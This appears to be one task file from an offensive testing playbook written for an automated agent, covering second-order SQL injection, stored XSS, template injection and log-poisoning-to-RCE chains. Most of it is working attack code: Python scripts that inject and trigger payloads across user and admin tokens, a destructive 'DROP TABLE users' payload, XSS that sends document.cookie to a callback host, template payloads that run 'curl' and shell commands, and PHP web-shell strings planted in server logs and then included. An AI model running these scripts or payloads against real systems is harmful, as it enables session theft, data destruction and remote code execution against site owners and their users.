@@ -1,0 +1,1028 @@
+================================================================================
+TASK 92 - SECOND-ORDER ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 14 Step 47
+Stored payloads that trigger in different contexts
+
+SECOND-ORDER = DELAYED GRATIFICATION
+Your payload is stored in one place, triggers in another.
+Most scanners miss these because they test input→output directly.
+
+Real-world examples:
+- SQLi in profile → triggers when admin exports CSV
+- XSS in username → fires when admin views user list
+- SSTI in feedback → renders in email notification
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/har/accounts/*_auth.json           <- Auth tokens (multi-role)
+outputs/har/common_data.txt                <- Endpoints from HAR
+
+Previous task outputs for chaining:
+outputs/sqli/sqli_confirmed.txt            <- SQLi endpoints
+outputs/xss/xss_confirmed.txt              <- XSS endpoints
+outputs/ssti/ssti_confirmed.txt            <- SSTI endpoints
+outputs/lfi/lfi_confirmed.txt              <- LFI endpoints
+outputs/interactsh_id.txt                  <- OOB callback domain
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/second_order/
+    injection_points.txt                   <- Input points for stored payloads
+    trigger_contexts.txt                   <- Where payloads might trigger
+    sqli_second_order.txt                  <- Second-order SQLi findings
+    xss_second_order.txt                   <- Second-order XSS findings
+    ssti_second_order.txt                  <- Second-order SSTI findings
+    log_poisoning.txt                      <- Log poisoning → LFI chains
+    confirmed_chains.txt                   <- Verified attack chains
+
+outputs/vulnerabilities/SECOND-ORDER-*-HIGH.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND SECOND-ORDER ATTACKS:
+
+    What makes them "second-order"?
+    |
+    +-- FIRST-ORDER (immediate):
+    |   +-- Input: search?q=<script>alert(1)</script>
+    |   +-- Output: Reflected immediately in response
+    |   +-- Detection: Easy, automated scanners catch it
+    |
+    +-- SECOND-ORDER (delayed):
+        +-- Input: Update profile → username=<script>alert(1)</script>
+        +-- Storage: Saved to database
+        +-- Trigger: Admin views user management page
+        +-- Detection: HARD, requires understanding data flow
+
+    Why are these missed?
+    |
+    +-- Scanners test input→response directly
+    +-- Payload is stored, not immediately executed
+    +-- Different user context triggers it
+    +-- Different endpoint triggers it
+    +-- Time delay between injection and execution
+
+    Attack flow mapping:
+    |
+    Input Point          Storage          Trigger Context
+    ──────────────────   ──────────────   ─────────────────
+    User profile         Database         Admin user list
+    Feedback form        Database         Support dashboard  
+    Log message          Log file         Log viewer/LFI
+    Email subject        Email server     Admin inbox
+    Filename             Filesystem       File manager
+    API field            Database         Report generator
+    Webhook URL          Database         Background job
+
+================================================================================
+PHASE 1: MAP INPUT POINTS
+================================================================================
+
+-----------------------------------------
+1.1 Identify Stored Data Endpoints
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+map_stored_inputs.py - Find endpoints that store user data
+
+Second-order attacks require data to be STORED.
+Look for: POST/PUT endpoints, profile updates, forms, etc.
+"""
+
+import re
+import os
+
+os.makedirs('outputs/second_order', exist_ok=True)
+
+# Patterns indicating data storage
+STORAGE_INDICATORS = {
+    'profile': ['profile', 'account', 'settings', 'preferences'],
+    'user_data': ['name', 'username', 'email', 'bio', 'description'],
+    'feedback': ['feedback', 'comment', 'review', 'rating', 'support'],
+    'content': ['post', 'article', 'page', 'content', 'message'],
+    'file': ['upload', 'file', 'document', 'attachment', 'image'],
+    'config': ['webhook', 'callback', 'url', 'endpoint', 'api'],
+    'order': ['order', 'cart', 'checkout', 'payment', 'address'],
+}
+
+def find_storage_endpoints(url_corpus_file):
+    """Find endpoints that likely store data"""
+    
+    storage_endpoints = []
+    
+    with open(url_corpus_file) as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    for url in urls:
+        url_lower = url.lower()
+        
+        for category, keywords in STORAGE_INDICATORS.items():
+            for keyword in keywords:
+                if keyword in url_lower:
+                    storage_endpoints.append({
+                        'url': url,
+                        'category': category,
+                        'keyword': keyword
+                    })
+                    break
+    
+    return storage_endpoints
+
+# Find all potential storage points
+storage_points = find_storage_endpoints('outputs/url_corpus_all_in_scope.txt')
+
+with open('outputs/second_order/injection_points.txt', 'w') as f:
+    for point in storage_points:
+        f.write(f"{point['category']}|{point['url']}\n")
+
+print(f"[*] Found {len(storage_points)} potential storage endpoints")
+
+-----------------------------------------
+1.2 Identify Trigger Contexts
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+map_trigger_contexts.py - Find where stored data might be rendered
+
+These are the places where your stored payload might execute.
+"""
+
+# Trigger context indicators
+TRIGGER_CONTEXTS = {
+    'admin_views': [
+        '/admin', '/dashboard', '/manage', '/users', '/reports',
+        '/export', '/analytics', '/logs', '/audit'
+    ],
+    'email_rendering': [
+        '/email', '/notification', '/alert', '/digest',
+        '/newsletter', '/template'
+    ],
+    'pdf_generation': [
+        '/pdf', '/report', '/invoice', '/export', '/download',
+        '/print', '/generate'
+    ],
+    'log_viewing': [
+        '/logs', '/audit', '/activity', '/history', '/events'
+    ],
+    'search_results': [
+        '/search', '/find', '/query', '/results'
+    ],
+    'api_responses': [
+        '/api/users', '/api/list', '/api/export', '/api/report'
+    ]
+}
+
+def find_trigger_contexts(url_corpus_file):
+    """Find endpoints where stored data might be rendered"""
+    
+    triggers = []
+    
+    with open(url_corpus_file) as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    for url in urls:
+        url_lower = url.lower()
+        
+        for context, patterns in TRIGGER_CONTEXTS.items():
+            for pattern in patterns:
+                if pattern in url_lower:
+                    triggers.append({
+                        'url': url,
+                        'context': context,
+                        'pattern': pattern
+                    })
+                    break
+    
+    return triggers
+
+triggers = find_trigger_contexts('outputs/url_corpus_all_in_scope.txt')
+
+with open('outputs/second_order/trigger_contexts.txt', 'w') as f:
+    for t in triggers:
+        f.write(f"{t['context']}|{t['url']}\n")
+
+print(f"[*] Found {len(triggers)} potential trigger contexts")
+
+================================================================================
+PHASE 2: SECOND-ORDER SQL INJECTION
+================================================================================
+
+-----------------------------------------
+2.1 Understanding Second-Order SQLi
+-----------------------------------------
+"""
+CLASSIC SCENARIO:
+
+1. User registers with username: admin'--
+2. Username stored in database (properly escaped on INSERT)
+3. Later, admin exports user list to CSV
+4. Export query: SELECT * FROM users WHERE username = '{username}'
+5. Query becomes: SELECT * FROM users WHERE username = 'admin'--'
+6. SQLi triggered in export context!
+
+WHY IT WORKS:
+- Input is sanitized for INSERT (parameterized)
+- But NOT sanitized when retrieved and used in another query
+- Different code path, different developer, different assumptions
+"""
+
+-----------------------------------------
+2.2 Second-Order SQLi Payloads
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+second_order_sqli.py - Test for second-order SQL injection
+"""
+
+import requests
+import time
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# Payloads designed to trigger on retrieval
+SECOND_ORDER_SQLI_PAYLOADS = [
+    # Basic injection
+    "admin'--",
+    "admin' OR '1'='1",
+    "admin'; DROP TABLE users--",
+    
+    # Time-based (triggers on retrieval)
+    "admin' AND SLEEP(5)--",
+    "admin'; WAITFOR DELAY '0:0:5'--",
+    "admin' AND pg_sleep(5)--",
+    
+    # Error-based
+    "admin' AND 1=CONVERT(int,(SELECT @@version))--",
+    "admin' AND extractvalue(1,concat(0x7e,version()))--",
+    
+    # Boolean-based
+    "admin' AND '1'='1",
+    "admin' AND '1'='2",
+    
+    # Union-based (for exports)
+    "admin' UNION SELECT NULL,NULL,NULL--",
+    "admin' UNION SELECT username,password,NULL FROM users--",
+    
+    # Out-of-band
+    "admin'; SELECT load_file('\\\\\\\\CALLBACK_DOMAIN\\\\a')--",
+    "admin' AND (SELECT * FROM (SELECT CONCAT(0x717a7a7171,(SELECT (ELT(1337=1337,1))),0x7162627a71,0x78))a)--",
+]
+
+class SecondOrderSQLiTester:
+    
+    def __init__(self, callback_domain):
+        self.callback = callback_domain
+        self.session = requests.Session()
+        self.results = []
+    
+    def inject(self, inject_url, field_name, payload, auth_token=None):
+        """Inject payload into storage endpoint"""
+        
+        headers = {}
+        if auth_token:
+            headers['Authorization'] = f'Bearer {auth_token}'
+        
+        # Replace callback placeholder
+        payload = payload.replace('CALLBACK_DOMAIN', self.callback)
+        
+        data = {field_name: payload}
+        
+        try:
+            resp = self.session.post(
+                inject_url,
+                json=data,
+                headers=headers,
+                timeout=30,
+                verify=False
+            )
+            return resp.status_code in [200, 201, 204]
+        except:
+            return False
+    
+    def trigger(self, trigger_url, auth_token=None):
+        """Trigger the stored payload"""
+        
+        headers = {}
+        if auth_token:
+            headers['Authorization'] = f'Bearer {auth_token}'
+        
+        start = time.time()
+        
+        try:
+            resp = self.session.get(
+                trigger_url,
+                headers=headers,
+                timeout=60,
+                verify=False
+            )
+            
+            elapsed = time.time() - start
+            
+            return {
+                'status': resp.status_code,
+                'time': elapsed,
+                'body': resp.text[:1000],
+                'error': 'error' in resp.text.lower() or 'sql' in resp.text.lower()
+            }
+        except Exception as e:
+            return {'status': 'error', 'error': str(e)}
+    
+    def test_second_order(self, inject_url, trigger_url, field_name, 
+                          user_token=None, admin_token=None):
+        """Test for second-order SQLi"""
+        
+        print(f"[*] Testing: {inject_url} -> {trigger_url}")
+        
+        for payload in SECOND_ORDER_SQLI_PAYLOADS:
+            # Inject as regular user
+            if self.inject(inject_url, field_name, payload, user_token):
+                print(f"  [+] Injected: {payload[:30]}...")
+                
+                # Trigger as admin (or different context)
+                result = self.trigger(trigger_url, admin_token)
+                
+                # Check for indicators
+                if result.get('time', 0) > 4.5:  # Time-based
+                    print(f"  [!!!] TIME-BASED TRIGGER: {payload}")
+                    self.results.append({
+                        'type': 'time-based',
+                        'inject': inject_url,
+                        'trigger': trigger_url,
+                        'payload': payload,
+                        'evidence': f"Response time: {result['time']}s"
+                    })
+                
+                if result.get('error'):  # Error-based
+                    print(f"  [!!!] ERROR-BASED TRIGGER: {payload}")
+                    self.results.append({
+                        'type': 'error-based',
+                        'inject': inject_url,
+                        'trigger': trigger_url,
+                        'payload': payload,
+                        'evidence': result['body'][:200]
+                    })
+                
+                time.sleep(1)
+        
+        return self.results
+
+================================================================================
+PHASE 3: SECOND-ORDER XSS
+================================================================================
+
+-----------------------------------------
+3.1 Understanding Second-Order XSS
+-----------------------------------------
+"""
+CLASSIC SCENARIO:
+
+1. User sets username to: <script>alert(document.domain)</script>
+2. Username stored in database (HTML encoding on profile page)
+3. Admin views "User Management" page
+4. Admin page doesn't HTML-encode usernames
+5. XSS fires in admin's browser!
+
+WHY IT MATTERS:
+- Regular XSS scanners don't find this
+- Different rendering context = different escaping
+- Admin context = higher privileges = bigger impact
+- Session hijacking of admin = full compromise
+"""
+
+-----------------------------------------
+3.2 Second-Order XSS Payloads
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+second_order_xss.py - Test for second-order XSS
+"""
+
+import requests
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# Payloads designed to trigger in different contexts
+SECOND_ORDER_XSS_PAYLOADS = [
+    # Basic stored XSS
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    
+    # Event handlers (various contexts)
+    "\" onclick=\"alert('XSS')\"",
+    "' onmouseover='alert(1)'",
+    "<body onload=alert('XSS')>",
+    
+    # JavaScript URL
+    "javascript:alert('XSS')",
+    "<a href=\"javascript:alert('XSS')\">click</a>",
+    
+    # Template injection context
+    "{{constructor.constructor('alert(1)')()}}",
+    "${alert('XSS')}",
+    
+    # PDF context (if exported to PDF)
+    "<script>app.alert('XSS')</script>",
+    
+    # Email context
+    "<img src='http://CALLBACK_DOMAIN/xss?c='+document.cookie>",
+    
+    # With callback for blind detection
+    "<script>new Image().src='http://CALLBACK_DOMAIN/xss?d='+document.domain</script>",
+    "<img src=x onerror=\"fetch('http://CALLBACK_DOMAIN/xss?c='+document.cookie)\">",
+    
+    # Bypasses
+    "<ScRiPt>alert('XSS')</ScRiPt>",
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "<<script>script>alert('XSS')<</script>/script>",
+    
+    # Admin-specific triggers
+    "<script>if(document.domain.includes('admin'))alert('ADMIN-XSS')</script>",
+]
+
+class SecondOrderXSSTester:
+    
+    def __init__(self, callback_domain):
+        self.callback = callback_domain
+        self.session = requests.Session()
+        self.injections = []
+    
+    def inject(self, url, field, payload, token=None):
+        """Store XSS payload"""
+        
+        payload = payload.replace('CALLBACK_DOMAIN', self.callback)
+        
+        headers = {}
+        if token:
+            headers['Authorization'] = f'Bearer {token}'
+        
+        try:
+            resp = self.session.post(
+                url,
+                json={field: payload},
+                headers=headers,
+                timeout=30,
+                verify=False
+            )
+            
+            if resp.status_code in [200, 201, 204]:
+                self.injections.append({
+                    'url': url,
+                    'field': field,
+                    'payload': payload
+                })
+                return True
+                
+        except:
+            pass
+        
+        return False
+    
+    def check_trigger(self, trigger_url, payload, token=None):
+        """Check if payload appears in trigger context"""
+        
+        headers = {}
+        if token:
+            headers['Authorization'] = f'Bearer {token}'
+        
+        try:
+            resp = self.session.get(
+                trigger_url,
+                headers=headers,
+                timeout=30,
+                verify=False
+            )
+            
+            # Check for payload reflection
+            if payload in resp.text:
+                return {'reflected': True, 'body': resp.text}
+            
+            # Check for HTML-encoded version
+            import html
+            if html.escape(payload) in resp.text:
+                return {'reflected': False, 'encoded': True}
+            
+            return {'reflected': False, 'encoded': False}
+            
+        except:
+            return {'error': True}
+
+================================================================================
+PHASE 4: SECOND-ORDER SSTI
+================================================================================
+
+-----------------------------------------
+4.1 Second-Order SSTI Scenarios
+-----------------------------------------
+"""
+CLASSIC SCENARIO:
+
+1. User submits feedback: {{7*7}}
+2. Feedback stored in database
+3. Admin receives email notification with feedback content
+4. Email template: "User feedback: {{ feedback.content }}"
+5. Template engine processes stored payload
+6. 49 appears in email (SSTI confirmed!)
+
+ESCALATION:
+- Feedback: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+- Email contains output of 'id' command
+- RCE achieved!
+"""
+
+-----------------------------------------
+4.2 Second-Order SSTI Payloads
+-----------------------------------------
+SECOND_ORDER_SSTI_PAYLOADS = [
+    # Detection payloads
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "#{7*7}",
+    "{{7*'7'}}",  # Returns 7777777 in Jinja2
+    
+    # Jinja2 (Python/Flask)
+    "{{config}}",
+    "{{self.__class__.__mro__}}",
+    "{{''.__class__.__mro__[2].__subclasses__()}}",
+    
+    # Twig (PHP)
+    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    
+    # Freemarker (Java)
+    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+    
+    # Velocity (Java)
+    "#set($e='')#foreach($c in [1..$req.getParameter('cmd').length()])#set($e=$e+$req.getParameter('cmd').charAt($c-1))#end$e",
+    
+    # Pebble (Java)
+    "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}",
+    
+    # With callback
+    "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('curl CALLBACK_DOMAIN')|attr('read')()}}",
+]
+
+================================================================================
+PHASE 5: LOG POISONING → LFI → RCE
+================================================================================
+
+-----------------------------------------
+5.1 Log Poisoning Chain
+-----------------------------------------
+"""
+ATTACK CHAIN:
+
+1. LFI CONFIRMED: /page?file=../../../var/log/apache2/access.log
+   (Can read log files)
+
+2. POISON THE LOG:
+   Send request with User-Agent: <?php system($_GET['cmd']); ?>
+   This gets written to access.log
+
+3. TRIGGER VIA LFI:
+   /page?file=../../../var/log/apache2/access.log&cmd=id
+   
+4. RCE ACHIEVED:
+   PHP code in log file gets executed when included
+
+LOG FILES TO TARGET:
+- /var/log/apache2/access.log
+- /var/log/apache2/error.log
+- /var/log/nginx/access.log
+- /var/log/nginx/error.log
+- /var/log/httpd/access_log
+- /var/log/mail.log
+- /var/log/auth.log
+- /proc/self/environ
+- /proc/self/fd/0-10
+"""
+
+-----------------------------------------
+5.2 Log Poisoning Script
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+log_poisoning.py - Chain log poisoning with LFI for RCE
+"""
+
+import requests
+import os
+
+requests.packages.urllib3.disable_warnings()
+
+# Common log paths
+LOG_PATHS = [
+    '/var/log/apache2/access.log',
+    '/var/log/apache/access.log',
+    '/var/log/apache2/error.log',
+    '/var/log/nginx/access.log',
+    '/var/log/nginx/error.log',
+    '/var/log/httpd/access_log',
+    '/var/log/httpd/error_log',
+    '/var/log/mail.log',
+    '/var/log/vsftpd.log',
+    '/var/log/sshd.log',
+    '/proc/self/environ',
+    '/proc/self/fd/1',
+]
+
+# Poison payloads
+POISON_PAYLOADS = {
+    'user_agent_php': '<?php system($_GET["cmd"]); ?>',
+    'user_agent_passthru': '<?php passthru($_GET["cmd"]); ?>',
+    'user_agent_eval': '<?php eval($_GET["cmd"]); ?>',
+    'referer_php': '<?php system($_GET["cmd"]); ?>',
+}
+
+class LogPoisonExploiter:
+    
+    def __init__(self, base_url, lfi_param, callback_domain):
+        self.base_url = base_url
+        self.lfi_param = lfi_param
+        self.callback = callback_domain
+        self.session = requests.Session()
+    
+    def check_log_readable(self, log_path):
+        """Check if log file is readable via LFI"""
+        
+        url = f"{self.base_url}?{self.lfi_param}=..{log_path}"
+        
+        try:
+            resp = self.session.get(url, timeout=15, verify=False)
+            
+            # Check for log-like content
+            log_indicators = ['GET /', 'POST /', 'HTTP/1', 'Mozilla', '[error]']
+            
+            if any(ind in resp.text for ind in log_indicators):
+                return True
+                
+        except:
+            pass
+        
+        return False
+    
+    def poison_log(self, payload_type='user_agent_php'):
+        """Inject PHP payload into logs"""
+        
+        payload = POISON_PAYLOADS.get(payload_type)
+        
+        headers = {}
+        
+        if 'user_agent' in payload_type:
+            headers['User-Agent'] = payload
+        if 'referer' in payload_type:
+            headers['Referer'] = payload
+        
+        # Send request to poison logs
+        try:
+            self.session.get(
+                self.base_url,
+                headers=headers,
+                timeout=10,
+                verify=False
+            )
+            return True
+        except:
+            return False
+    
+    def trigger_rce(self, log_path, command):
+        """Trigger RCE via LFI of poisoned log"""
+        
+        url = f"{self.base_url}?{self.lfi_param}=..{log_path}&cmd={command}"
+        
+        try:
+            resp = self.session.get(url, timeout=30, verify=False)
+            return resp.text
+        except:
+            return None
+    
+    def full_chain(self):
+        """Execute full log poisoning chain"""
+        
+        print("[*] Checking readable log files...")
+        
+        readable_logs = []
+        for log_path in LOG_PATHS:
+            if self.check_log_readable(log_path):
+                print(f"  [+] Readable: {log_path}")
+                readable_logs.append(log_path)
+        
+        if not readable_logs:
+            print("[-] No readable log files found")
+            return None
+        
+        print(f"\n[*] Poisoning logs...")
+        self.poison_log('user_agent_php')
+        
+        print("[*] Triggering RCE...")
+        for log_path in readable_logs:
+            result = self.trigger_rce(log_path, 'id')
+            
+            if result and 'uid=' in result:
+                print(f"[!!!] RCE CONFIRMED via {log_path}")
+                return {
+                    'vulnerable': True,
+                    'log_path': log_path,
+                    'evidence': result
+                }
+        
+        return None
+
+================================================================================
+PHASE 6: FULL AUTOMATION
+================================================================================
+
+#!/usr/bin/env python3
+"""
+second_order_full.py - Complete second-order attack assessment
+"""
+
+import os
+import json
+import requests
+import time
+
+os.makedirs('outputs/second_order', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class SecondOrderScanner:
+    
+    def __init__(self, callback_domain):
+        self.callback = callback_domain
+        self.session = requests.Session()
+        self.findings = []
+    
+    def map_injection_points(self, urls):
+        """Map all potential injection points"""
+        
+        injection_keywords = [
+            'profile', 'account', 'settings', 'name', 'username',
+            'email', 'bio', 'description', 'feedback', 'comment',
+            'post', 'message', 'webhook', 'url', 'callback'
+        ]
+        
+        injection_points = []
+        
+        for url in urls:
+            for keyword in injection_keywords:
+                if keyword in url.lower():
+                    injection_points.append({
+                        'url': url,
+                        'keyword': keyword
+                    })
+                    break
+        
+        return injection_points
+    
+    def map_trigger_points(self, urls):
+        """Map all potential trigger points"""
+        
+        trigger_keywords = [
+            'admin', 'dashboard', 'manage', 'export', 'report',
+            'email', 'notification', 'pdf', 'log', 'search'
+        ]
+        
+        trigger_points = []
+        
+        for url in urls:
+            for keyword in trigger_keywords:
+                if keyword in url.lower():
+                    trigger_points.append({
+                        'url': url,
+                        'keyword': keyword
+                    })
+                    break
+        
+        return trigger_points
+    
+    def test_sqli_second_order(self, inject_url, trigger_url, 
+                               user_token, admin_token):
+        """Test for second-order SQLi"""
+        
+        payloads = [
+            "admin' AND SLEEP(5)--",
+            "admin' AND 1=1--",
+            "admin'; WAITFOR DELAY '0:0:5'--",
+        ]
+        
+        for payload in payloads:
+            # Inject
+            try:
+                resp = self.session.post(
+                    inject_url,
+                    json={'name': payload},
+                    headers={'Authorization': f'Bearer {user_token}'},
+                    timeout=30,
+                    verify=False
+                )
+                
+                if resp.status_code not in [200, 201]:
+                    continue
+                
+            except:
+                continue
+            
+            # Trigger
+            start = time.time()
+            try:
+                resp = self.session.get(
+                    trigger_url,
+                    headers={'Authorization': f'Bearer {admin_token}'},
+                    timeout=60,
+                    verify=False
+                )
+                elapsed = time.time() - start
+                
+                if elapsed > 4.5:
+                    self.findings.append({
+                        'type': 'second-order-sqli',
+                        'inject': inject_url,
+                        'trigger': trigger_url,
+                        'payload': payload,
+                        'evidence': f'Response time: {elapsed:.2f}s'
+                    })
+                    return True
+                    
+            except:
+                pass
+        
+        return False
+    
+    def test_xss_second_order(self, inject_url, trigger_url,
+                              user_token, admin_token):
+        """Test for second-order XSS"""
+        
+        # Use callback-based XSS for blind detection
+        payload = f"<img src=x onerror=\"fetch('http://{self.callback}/xss?'+" \
+                  f"document.cookie)\">"
+        
+        # Inject
+        try:
+            self.session.post(
+                inject_url,
+                json={'name': payload},
+                headers={'Authorization': f'Bearer {user_token}'},
+                timeout=30,
+                verify=False
+            )
+        except:
+            pass
+        
+        # Trigger (check OOB callback for actual confirmation)
+        try:
+            resp = self.session.get(
+                trigger_url,
+                headers={'Authorization': f'Bearer {admin_token}'},
+                timeout=30,
+                verify=False
+            )
+            
+            # Check for reflection (may be encoded)
+            if payload in resp.text or '<img' in resp.text:
+                self.findings.append({
+                    'type': 'second-order-xss',
+                    'inject': inject_url,
+                    'trigger': trigger_url,
+                    'payload': payload,
+                    'evidence': 'Payload reflected in trigger response'
+                })
+                return True
+                
+        except:
+            pass
+        
+        return False
+    
+    def generate_report(self, finding):
+        """Generate vulnerability report"""
+        
+        vuln_type = finding['type'].replace('-', ' ').upper()
+        
+        report = f"""# {vuln_type} Vulnerability
+
+**Severity**: HIGH
+**Injection Point**: {finding['inject']}
+**Trigger Point**: {finding['trigger']}
+
+## Description
+A second-order {finding['type'].split('-')[2]} vulnerability was identified.
+Data stored at the injection point is not properly sanitized when retrieved
+and used at the trigger point.
+
+## Attack Flow
+1. Attacker injects payload at: `{finding['inject']}`
+2. Payload is stored in the database
+3. When admin/system accesses: `{finding['trigger']}`
+4. Payload executes in the trigger context
+
+## Payload
+```
+{finding['payload']}
+```
+
+## Evidence
+{finding['evidence']}
+
+## Impact
+- Admin session hijacking (XSS)
+- Database extraction (SQLi)
+- Remote code execution (SSTI/Log poisoning)
+- Privilege escalation
+
+## Recommendations
+1. Apply consistent input validation across ALL code paths
+2. Use parameterized queries for ALL database operations
+3. HTML-encode output in ALL rendering contexts
+4. Regular security audits of data flow paths
+"""
+        
+        return report
+    
+    def save_results(self):
+        """Save all results"""
+        
+        with open('outputs/second_order/confirmed_chains.txt', 'w') as f:
+            for finding in self.findings:
+                f.write(f"{finding['type']}|{finding['inject']}|{finding['trigger']}\n")
+        
+        with open('outputs/second_order/findings.json', 'w') as f:
+            json.dump(self.findings, f, indent=2)
+        
+        for i, finding in enumerate(self.findings):
+            report = self.generate_report(finding)
+            with open(f"outputs/vulnerabilities/SECOND-ORDER-{i}-HIGH.md", 'w') as f:
+                f.write(report)
+
+# Run
+if __name__ == "__main__":
+    # Get callback domain from interactsh
+    with open('outputs/interactsh_id.txt') as f:
+        callback = f.read().strip()
+    
+    scanner = SecondOrderScanner(callback)
+    
+    # Load URLs
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    injection_points = scanner.map_injection_points(urls)
+    trigger_points = scanner.map_trigger_points(urls)
+    
+    print(f"[*] Injection points: {len(injection_points)}")
+    print(f"[*] Trigger points: {len(trigger_points)}")
+    print(f"[*] Testing combinations...")
+    
+    # Test combinations
+    # for inject in injection_points:
+    #     for trigger in trigger_points:
+    #         scanner.test_sqli_second_order(...)
+    #         scanner.test_xss_second_order(...)
+    
+    scanner.save_results()
+    print(f"\n[*] Second-order findings: {len(scanner.findings)}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Storage endpoints mapped (profile, feedback, etc.)
+[ ] Trigger contexts mapped (admin views, exports, emails)
+[ ] Second-order SQLi tested with time-based payloads
+[ ] Second-order XSS tested with callback payloads
+[ ] Second-order SSTI tested in email/PDF contexts
+[ ] Log poisoning → LFI → RCE chain tested
+[ ] All findings documented with attack chains
+[ ] OOB callback monitored for blind triggers
+
+================================================================================
+KEY INSIGHT
+================================================================================
+
+WHY SCANNERS MISS SECOND-ORDER:
+- They test input → immediate output
+- Second-order requires: input → storage → different trigger
+- Different user context (user injects, admin triggers)
+- Different code path (store vs retrieve)
+- Time delay between injection and execution
+
+YOUR ADVANTAGE:
+- Manual testing catches what automation misses
+- Think about DATA FLOW, not just input/output
+- Consider ALL contexts where data gets rendered
+- Use OOB callbacks for blind detection
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 93: CORS Misconfiguration (Phase 15 - Misc Advanced)
